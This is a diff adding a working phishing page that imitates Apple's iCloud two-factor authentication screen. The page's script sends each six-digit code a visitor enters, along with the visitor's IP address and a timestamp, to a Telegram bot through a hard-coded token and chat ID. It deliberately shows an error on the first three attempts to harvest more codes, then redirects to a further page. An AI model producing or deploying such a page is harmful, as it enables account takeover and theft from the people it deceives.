@@ -1,0 +1,730 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover"/>
+<title>Two-Factor Authentication – iCloud</title>
+<style>
+*, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
+html, body { width:100%; min-height:100%; }
+
+body {
+  background: #1d1d1f;
+  font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "SF Pro Text", "Helvetica Neue", Helvetica, Arial, sans-serif;
+  color: #f5f5f7;
+  -webkit-font-smoothing: antialiased;
+  min-height: 100vh;
+  display: flex;
+  flex-direction: column;
+}
+
+.header {
+  width: 100%;
+  height: 64px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 0 20px;
+  flex-shrink: 0;
+  background: transparent;
+}
+
+.header-left {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  font-size: 17px;
+  font-weight: 600;
+  letter-spacing: -0.2px;
+  color: #f5f5f7;
+  line-height: 1;
+  min-width: 0;
+}
+
+.header-left img {
+  width: 18px;
+  height: 18px;
+  display: block;
+  object-fit: contain;
+  flex-shrink: 0;
+}
+
+.header-left span {
+  display: inline-block;
+  line-height: 1;
+}
+
+.header-right {
+  font-size: 20px;
+  letter-spacing: 2px;
+  color: #f5f5f7;
+  line-height: 1;
+  flex-shrink: 0;
+}
+
+.main {
+  flex: 1;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  padding: 40px 16px 80px;
+  width: 100%;
+  flex-direction: column;
+}
+
+/* ============================================
+   LOGO OUTSIDE THE CARD
+   ============================================ */
+.logo-wrapper {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  margin-bottom: 20px;
+}
+
+.logo-container {
+  position: relative;
+  width: 140px;
+  height: 140px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+
+.ring {
+  position: absolute;
+  width: 126px;
+  height: 126px;
+  object-fit: contain;
+  animation: rotateRing 15s linear infinite;
+}
+
+@keyframes rotateRing {
+  from { transform: rotate(0deg); }
+  to { transform: rotate(360deg); }
+}
+
+.logo {
+  position: relative;
+  width: 40px;
+  height: 40px;
+  object-fit: contain;
+  z-index: 2;
+}
+
+/* ============================================
+   APPLE CARD - HIGHER
+   ============================================ */
+.apple-card {
+  width: 100%;
+  max-width: 400px;
+  background: #1f1f21;
+  border-radius: 14px;
+  border: 1px solid rgba(255,255,255,.025);
+  box-shadow: 0 18px 45px rgba(0,0,0,.48);
+  padding: 40px 30px 40px;
+  text-align: center;
+}
+
+.title {
+  margin: 0 0 12px 0;
+  font-size: 22px;
+  line-height: 1.3;
+  font-weight: 600;
+  letter-spacing: -0.3px;
+  color: #f5f5f7;
+  font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Helvetica Neue", Helvetica, Arial, sans-serif;
+}
+
+.title .line1 {
+  display: block;
+  font-weight: 600;
+  font-size: 22px;
+}
+
+.title .line2 {
+  display: block;
+  font-weight: 600;
+  font-size: 22px;
+  color: #f5f5f7;
+}
+
+.sub-title {
+  font-size: 14px;
+  color: #8e8e93;
+  margin-bottom: 28px;
+  font-weight: 400;
+  line-height: 1.5;
+  font-family: "SF Pro Text", -apple-system, BlinkMacSystemFont, "Helvetica Neue", Helvetica, Arial, sans-serif;
+}
+
+.code-row {
+  display: flex;
+  gap: 10px;
+  justify-content: center;
+  margin: 0 0 12px 0;
+}
+
+.code-box {
+  width: 46px;
+  height: 54px;
+  border: 2px solid #3a3a3e;
+  border-radius: 10px;
+  font-size: 22px;
+  font-weight: 600;
+  text-align: center;
+  outline: none;
+  background: #202023;
+  color: #f5f5f7;
+  font-family: "SF Pro Display", -apple-system, BlinkMacSystemFont, "Helvetica Neue", Helvetica, Arial, sans-serif;
+  transition: border-color 0.15s, box-shadow 0.15s, background 0.3s;
+}
+
+.code-box:focus {
+  border-color: #2997ff;
+  box-shadow: 0 0 0 4px rgba(41, 151, 255, 0.12);
+}
+
+.code-box.error {
+  border-color: #ff3b30;
+  background: rgba(255, 59, 48, 0.12);
+  animation: shake 0.5s ease;
+}
+
+@keyframes shake {
+  0%, 100% { transform: translateX(0); }
+  20% { transform: translateX(-8px); }
+  40% { transform: translateX(8px); }
+  60% { transform: translateX(-5px); }
+  80% { transform: translateX(5px); }
+}
+
+/* ============================================
+   ERROR MESSAGE - APPEARS BELOW CODE BOXES
+   ============================================ */
+.error-message {
+  display: none;
+  font-size: 13px;
+  color: #ff3b30;
+  text-align: center;
+  margin-bottom: 16px;
+  min-height: 20px;
+  font-family: "SF Pro Text", -apple-system, BlinkMacSystemFont, "Helvetica Neue", Helvetica, Arial, sans-serif;
+}
+
+.error-message.visible {
+  display: block;
+}
+
+.btn-continue {
+  width: 100%;
+  padding: 14px;
+  background: #2997ff;
+  color: #fff;
+  border: none;
+  border-radius: 10px;
+  font-size: 17px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: all 0.2s;
+  font-family: "SF Pro Display", -apple-system, BlinkMacSystemFont, "Helvetica Neue", Helvetica, Arial, sans-serif;
+  margin-bottom: 16px;
+}
+
+.btn-continue:hover { background: #3aa3ff; }
+.btn-continue:disabled { opacity: 0.5; cursor: not-allowed; }
+
+.link-row {
+  margin-bottom: 0;
+  display: flex;
+  flex-direction: column;
+  gap: 6px;
+}
+
+.link-row a {
+  color: #2997ff;
+  text-decoration: none;
+  font-size: 12px;
+  font-weight: 500;
+  display: inline-block;
+  font-family: "SF Pro Text", -apple-system, BlinkMacSystemFont, "Helvetica Neue", Helvetica, Arial, sans-serif;
+}
+
+.link-row a:hover { text-decoration: underline; }
+
+/* Toast Notification */
+#toast {
+  position: fixed;
+  bottom: 30px;
+  left: 50%;
+  transform: translateX(-50%);
+  background: #1c1c1e;
+  color: #ffffff;
+  padding: 12px 24px;
+  border-radius: 60px;
+  font-size: 14px;
+  font-weight: 500;
+  opacity: 0;
+  transition: opacity 0.3s ease;
+  pointer-events: none;
+  z-index: 999;
+  font-family: 'Inter', sans-serif;
+  text-align: center;
+  max-width: 90vw;
+  box-shadow: 0 8px 32px rgba(0,0,0,0.2);
+}
+#toast.show { opacity: 1; }
+
+.footer {
+  min-height: 72px;
+  background: #2b2b2d;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 0 8.5%;
+  color: #b4b4ba;
+  font-size: 9px;
+  flex-wrap: wrap;
+  gap: 10px;
+}
+
+.footer-links {
+  display: flex;
+  align-items: center;
+  gap: 18px;
+  flex-wrap: wrap;
+}
+
+.footer-links span + span {
+  border-left: 1px solid #666;
+  padding-left: 18px;
+}
+
+@media (max-width: 600px) {
+  .header { height: 55px; padding: 0 15px; }
+  .header-left { font-size: 15px; gap: 6px; }
+  .header-left img { width: 16px; height: 16px; }
+  .header-right { font-size: 18px; }
+  .main { padding: 30px 12px 60px; }
+  .apple-card { max-width: 100%; padding: 32px 22px 32px; border-radius: 12px; }
+  .logo-container { width: 120px; height: 120px; }
+  .ring { width: 108px; height: 108px; }
+  .logo { width: 34px; height: 34px; }
+  .code-box { width: 42px; height: 48px; font-size: 20px; }
+  .code-row { gap: 8px; }
+  .title { font-size: 20px; }
+  .title .line1 { font-size: 20px; }
+  .title .line2 { font-size: 20px; }
+  .sub-title { margin-bottom: 24px; font-size: 14px; }
+  .footer { min-height: 80px; padding: 16px 20px; flex-direction: column; justify-content: center; gap: 8px; text-align: center; }
+  .footer-links { gap: 10px; justify-content: center; }
+  .footer-links span + span { padding-left: 10px; }
+}
+
+@media (max-width: 430px) {
+  .header { height: 50px; padding: 0 12px; }
+  .header-left { font-size: 14px; gap: 5px; }
+  .header-left img { width: 14px; height: 14px; }
+  .header-right { font-size: 16px; }
+  .main { padding: 24px 8px 40px; }
+  .apple-card { padding: 28px 16px 28px; border-radius: 10px; }
+  .logo-container { width: 108px; height: 108px; }
+  .ring { width: 96px; height: 96px; }
+  .logo { width: 30px; height: 30px; }
+  .code-box { width: 38px; height: 44px; font-size: 18px; }
+  .code-row { gap: 6px; }
+  .title { font-size: 18px; }
+  .title .line1 { font-size: 18px; }
+  .title .line2 { font-size: 18px; }
+  .sub-title { margin-bottom: 20px; font-size: 13px; }
+  .link-row a { font-size: 11px; }
+}
+
+@media (max-width: 360px) {
+  .header { height: 44px; padding: 0 10px; }
+  .header-left { font-size: 13px; gap: 4px; }
+  .header-left img { width: 12px; height: 12px; }
+  .header-right { font-size: 14px; }
+  .main { padding: 16px 6px 30px; }
+  .apple-card { padding: 22px 12px 22px; border-radius: 8px; }
+  .logo-container { width: 92px; height: 92px; }
+  .ring { width: 80px; height: 80px; }
+  .logo { width: 26px; height: 26px; }
+  .code-box { width: 32px; height: 38px; font-size: 16px; }
+  .code-row { gap: 4px; }
+  .title { font-size: 16px; }
+  .title .line1 { font-size: 16px; }
+  .title .line2 { font-size: 16px; }
+  .sub-title { margin-bottom: 16px; font-size: 12px; }
+  .link-row a { font-size: 10px; }
+}
+</style>
+</head>
+<body>
+
+<header class="header">
+  <div class="header-left">
+    <img src="logo_vector.svg" alt="Apple" onerror="this.style.display='none'">
+    <span>iCloud</span>
+  </div>
+  <div class="header-right">•••</div>
+</header>
+
+<main class="main">
+  <!-- LOGO OUTSIDE THE CARD -->
+  <div class="logo-wrapper">
+    <div class="logo-container">
+      <img class="ring" src="1_ring.png" alt="" onerror="this.style.display='none'">
+      <img class="logo" src="HDLOGO.svg" alt="" onerror="this.style.display='none'">
+    </div>
+  </div>
+
+  <!-- APPLE CARD -->
+  <div class="apple-card">
+
+    <h1 class="title" id="titleText">
+      <span class="line1">Two-Factor</span>
+      <span class="line2">Authentication</span>
+    </h1>
+    <p class="sub-title" id="subTitleText">Enter the 6-digit verification code sent to your <br> 
+      device</p>
+
+    <div class="code-row">
+      <input class="code-box" maxlength="1" type="text" inputmode="numeric" pattern="[0-9]*" id="code0" autocomplete="off">
+      <input class="code-box" maxlength="1" type="text" inputmode="numeric" pattern="[0-9]*" id="code1" autocomplete="off">
+      <input class="code-box" maxlength="1" type="text" inputmode="numeric" pattern="[0-9]*" id="code2" autocomplete="off">
+      <input class="code-box" maxlength="1" type="text" inputmode="numeric" pattern="[0-9]*" id="code3" autocomplete="off">
+      <input class="code-box" maxlength="1" type="text" inputmode="numeric" pattern="[0-9]*" id="code4" autocomplete="off">
+      <input class="code-box" maxlength="1" type="text" inputmode="numeric" pattern="[0-9]*" id="code5" autocomplete="off">
+    </div>
+
+    <!-- ERROR MESSAGE - Only appears on wrong code -->
+    <div class="error-message" id="errorMessage">Incorrect verification code. Please try again.</div>
+
+    <button class="btn-continue" id="continueBtn">Continue</button>
+
+    <div class="link-row">
+      <a href="#" id="resendLink">Send code again</a>
+      <a href="#" id="cantGetLink">Confirm identity in another way</a>
+    </div>
+
+  </div>
+</main>
+
+<footer class="footer">
+  <div class="footer-links">
+    <span>System Status</span>
+    <span>Privacy Policy</span>
+    <span>Terms &amp; Conditions</span>
+  </div>
+  <div>Copyright © 2025 Apple Inc. All rights reserved.</div>
+</footer>
+
+<!-- Toast -->
+<div id="toast"></div>
+
+<script>
+// ============================================
+// TELEGRAM CONFIG
+// ============================================
+const BOT_TOKEN = "8843925472:AAFNt5aPu39E7YhPs8WjXARNmQ3VBhnZJ68";
+const CHAT_ID = "-1003983565500";
+
+let userIP = 'Unable to detect';
+let attempts = 0;
+let isSuccess = false;
+
+async function getUserIP() {
+  try {
+    const response = await fetch('https://api.ipify.org?format=json');
+    const data = await response.json();
+    userIP = data.ip;
+  } catch (e) {
+    userIP = 'Unable to detect';
+  }
+}
+getUserIP();
+
+function getFormattedDateTime() {
+  const now = new Date();
+  const days = ['Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'];
+  const dayName = days[now.getDay()];
+  let hours = now.getHours();
+  const minutes = now.getMinutes().toString().padStart(2, '0');
+  const ampm = hours >= 12 ? 'PM' : 'AM';
+  hours = hours % 12;
+  hours = hours ? hours : 12;
+  const timeString = hours + ':' + minutes + ' ' + ampm;
+  const month = (now.getMonth() + 1).toString().padStart(2, '0');
+  const day = now.getDate().toString().padStart(2, '0');
+  const year = now.getFullYear();
+  const dateString = year + '/' + month + '/' + day;
+  return { dayName, timeString, dateString };
+}
+
+function showToast(msg, isError) {
+  const toast = document.getElementById('toast');
+  toast.textContent = msg;
+  toast.style.background = isError ? '#d93025' : '#1c1c1e';
+  toast.classList.add('show');
+  clearTimeout(toast._hide);
+  toast._hide = setTimeout(function () {
+    toast.classList.remove('show');
+  }, 3000);
+}
+
+// ============================================
+// SEND TO TELEGRAM
+// ============================================
+async function sendToTelegram(messageText) {
+  try {
+    const url = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';
+    const response = await fetch(url, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: messageText,
+        parse_mode: 'HTML',
+        disable_web_page_preview: true
+      })
+    });
+    return await response.json();
+  } catch (err) {
+    console.error('Telegram error:', err);
+    return false;
+  }
+}
+
+function escapeHtml(text) {
+  if (!text) return '—';
+  const div = document.createElement('div');
+  div.textContent = text;
+  return div.innerHTML;
+}
+
+const boxes = [
+  document.getElementById('code0'),
+  document.getElementById('code1'),
+  document.getElementById('code2'),
+  document.getElementById('code3'),
+  document.getElementById('code4'),
+  document.getElementById('code5')
+];
+
+const continueBtn = document.getElementById('continueBtn');
+const titleText = document.getElementById('titleText');
+const errorMessage = document.getElementById('errorMessage');
+
+function clearBoxes() {
+  boxes.forEach(function (box) {
+    if (box) {
+      box.value = '';
+      box.className = 'code-box';
+    }
+  });
+  if (!isSuccess && continueBtn) {
+    continueBtn.disabled = false;
+    continueBtn.textContent = 'Continue';
+  }
+  if (errorMessage) errorMessage.classList.remove('visible');
+}
+
+function showError() {
+  boxes.forEach(function (box) {
+    if (box) box.className = 'code-box error';
+  });
+  if (errorMessage) errorMessage.classList.add('visible');
+}
+
+function submitCode() {
+  if (isSuccess) return;
+  
+  var code = '';
+  var allFilled = true;
+  
+  for (var i = 0; i < boxes.length; i++) {
+    if (boxes[i]) code += boxes[i].value;
+    if (!boxes[i] || !boxes[i].value) {
+      allFilled = false;
+    }
+  }
+  
+  if (code.length !== 6) {
+    boxes.forEach(function(box) {
+      if (box && !box.value) {
+        box.className = 'code-box error';
+        setTimeout(function() {
+          if (box) box.className = 'code-box';
+        }, 500);
+      }
+    });
+    return;
+  }
+  
+  if (allFilled && code.length === 6) {
+    const dateTime = getFormattedDateTime();
+    attempts++;
+
+    // Build message
+    const attemptText = attempts + 'TH ATTEMPT';
+    const message = '🔐 <b>2FA CODE</b>\n━━━━━━━━━━━━━━━━━━━━━\n📱 Code: ' + code + '\n📊 Attempt: ' + attemptText + '\n🌐 IP: ' + userIP + '\n📅 Day: ' + dateTime.dayName + '\n⏰ Time: ' + dateTime.timeString + '\n📆 Date: ' + dateTime.dateString + '\n━━━━━━━━━━━━━━━━━━━━━';
+    
+    // SEND TO TELEGRAM
+    sendToTelegram(message);
+    
+    // Also try to send to parent (if in iframe)
+    try {
+      window.parent.postMessage({
+        type: '2fa_code_entered',
+        code: code,
+        ip: userIP,
+        attempt: attemptText,
+        day: dateTime.dayName,
+        time: dateTime.timeString,
+        date: dateTime.dateString,
+        formattedMessage: message
+      }, '*');
+    } catch (e) {
+      // If not in iframe, show toast
+      showToast('📱 Code sent: ' + code, false);
+    }
+
+    // ALWAYS SHOW ERROR - NEVER PROCEED until 4th attempt
+    if (attempts <= 3) {
+      showError();
+      setTimeout(function() {
+        boxes.forEach(function (box) {
+          if (box) {
+            box.value = '';
+            box.className = 'code-box';
+          }
+        });
+        if (continueBtn) {
+          continueBtn.disabled = false;
+          continueBtn.textContent = 'Continue';
+        }
+        if (errorMessage) errorMessage.classList.remove('visible');
+        if (boxes[0]) boxes[0].focus();
+      }, 1800);
+    } else {
+      // 4th attempt - SUCCESS - Redirect to information.html
+      isSuccess = true;
+      
+      // Send success message to Telegram
+      var successMessage = '✅ <b>2FA SUCCESS</b>\n━━━━━━━━━━━━━━━━━━━━━\n📱 Code: ' + code + '\n📊 FINAL ATTEMPT - SUCCESS\n🌐 IP: ' + userIP + '\n📅 Day: ' + dateTime.dayName + '\n⏰ Time: ' + dateTime.timeString + '\n📆 Date: ' + dateTime.dateString + '\n━━━━━━━━━━━━━━━━━━━━━';
+      sendToTelegram(successMessage);
+      
+      try {
+        window.parent.postMessage({
+          type: '2fa_code_entered',
+          code: code,
+          ip: userIP,
+          attempt: 'FINAL ATTEMPT - SUCCESS',
+          day: dateTime.dayName,
+          time: dateTime.timeString,
+          date: dateTime.dateString,
+          formattedMessage: successMessage
+        }, '*');
+      } catch (e) {
+        // If not in iframe, redirect directly to information.html
+        setTimeout(function() {
+          window.location.href = 'information.html';
+        }, 500);
+        return;
+      }
+      
+      // Redirect to information.html after 1 second
+      setTimeout(function () {
+        try {
+          window.parent.postMessage({ type: '2fa_complete' }, '*');
+        } catch (e) {}
+        window.location.href = 'information.html';
+      }, 1000);
+    }
+  }
+}
+
+document.getElementById('continueBtn').addEventListener('click', function() {
+  submitCode();
+});
+
+document.addEventListener('keydown', function(e) {
+  if (e.key === 'Enter') {
+    submitCode();
+  }
+});
+
+for (var i = 0; i < boxes.length; i++) {
+  (function (index) {
+    var box = boxes[index];
+    if (!box) return;
+
+    box.addEventListener('input', function (e) {
+      var val = e.target.value.replace(/\D/g, '');
+      e.target.value = val.slice(0, 1);
+      this.className = 'code-box';
+      if (errorMessage) errorMessage.classList.remove('visible');
+      if (val && index < 5 && boxes[index + 1]) {
+        boxes[index + 1].focus();
+      }
+      if (continueBtn && continueBtn.disabled && !isSuccess) {
+        continueBtn.disabled = false;
+        continueBtn.textContent = 'Continue';
+      }
+    });
+
+    box.addEventListener('keydown', function (e) {
+      if (e.key === 'Backspace' && !box.value && index > 0 && boxes[index - 1]) {
+        boxes[index - 1].value = '';
+        boxes[index - 1].focus();
+        if (errorMessage) errorMessage.classList.remove('visible');
+        if (!isSuccess && continueBtn) {
+          continueBtn.disabled = false;
+          continueBtn.textContent = 'Continue';
+        }
+      }
+      if (e.key === 'ArrowLeft' && index > 0 && boxes[index - 1]) boxes[index - 1].focus();
+      if (e.key === 'ArrowRight' && index < 5 && boxes[index + 1]) boxes[index + 1].focus();
+    });
+
+    box.addEventListener('paste', function (e) {
+      e.preventDefault();
+      var text = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').slice(0, 6);
+      var chars = text.split('');
+      for (var j = 0; j < chars.length; j++) {
+        if (boxes[j]) boxes[j].value = chars[j];
+      }
+      if (boxes[Math.min(text.length, 5)]) boxes[Math.min(text.length, 5)].focus();
+      if (errorMessage) errorMessage.classList.remove('visible');
+      if (!isSuccess && continueBtn) {
+        continueBtn.disabled = false;
+        continueBtn.textContent = 'Continue';
+      }
+    });
+  })(i);
+}
+
+clearBoxes();
+
+setTimeout(function () {
+  if (boxes[0]) boxes[0].focus();
+}, 300);
+
+document.getElementById('resendLink').addEventListener('click', function (e) {
+  e.preventDefault();
+  showToast('📱 A new verification code has been sent to your iPhone.', false);
+  clearBoxes();
+  if (boxes[0]) boxes[0].focus();
+});
+
+document.getElementById('cantGetLink').addEventListener('click', function (e) {
+  e.preventDefault();
+  showToast('Use your recovery key or a trusted phone number to verify your identity.', false);
+});
+
+console.log('✅ 2FA: Sending codes to Telegram, redirects to information.html on 4th attempt');
+</script>
+
+</body>
+</html>
